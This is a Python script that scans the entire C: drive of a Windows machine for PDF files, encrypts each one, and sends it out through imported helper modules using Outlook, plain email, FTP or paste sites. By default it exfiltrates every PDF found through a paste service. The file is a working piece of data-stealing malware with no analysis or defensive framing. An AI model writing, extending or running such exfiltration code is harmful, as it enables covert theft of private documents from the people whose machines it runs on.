from cryptor import encrypt, decrypt
from email_exfil import outlook, plain_email
from transmit_exfil import plain_ftp, transmit
from paste_exfil import ie_paste, plain_paste

import os

EXFIL = {                       #Create a dictionary of exfil methods 
    'outlook': outlook,
    'plain_email': plain_email,
    'plain_ftp': plain_ftp,
    'transmit': transmit,
    'ie_paste': ie_paste,
    'plain_paste': plain_paste,
    }
def find_docs(doc_type='.pdf'): #Walks the full os and finds any pdfs, returning the filepath when complete
    for parent, _, filenames in os.walk('c:\\'):
        for filename in filenames:
            if filename.endswith(doc_type):
                document_path = os.path.join(parent, filename)
                yield document_path

def exfiltrate(document_path, method):          #Exfiltrate with the path and method of exfiltration
    if method in ['transmit', 'plain_ftp']:     #Pertaining to FTP Methods
        filename = f'c:\\windows\\temp\\{os.path.basename(document_path)}'  
        with open(document_path, 'rb') as f0:
            contents = f0.read()                #Get Content
        with open(filename, 'wb') as f1:        
            f1.write(encrypt(contents))         #Encrypt contents
        
        EXFIL[method](filename)                 #Pass along exfil method with encrypted contents
        os.unlink(filename)
    else:
        with open(document_path, 'rb') as f:    #read the files to be exfil'd
            contents = f.read()
        title = os.path.basename(document_path) #get os path
        contents = encrypt(contents)            #Encrypt contents
        EXFIL[method](title, contents)          #Call the dictionary to email/paste the info

if __name__ == '__main__':
    for fpath in find_docs():
        exfiltrate(fpath, 'plain_paste')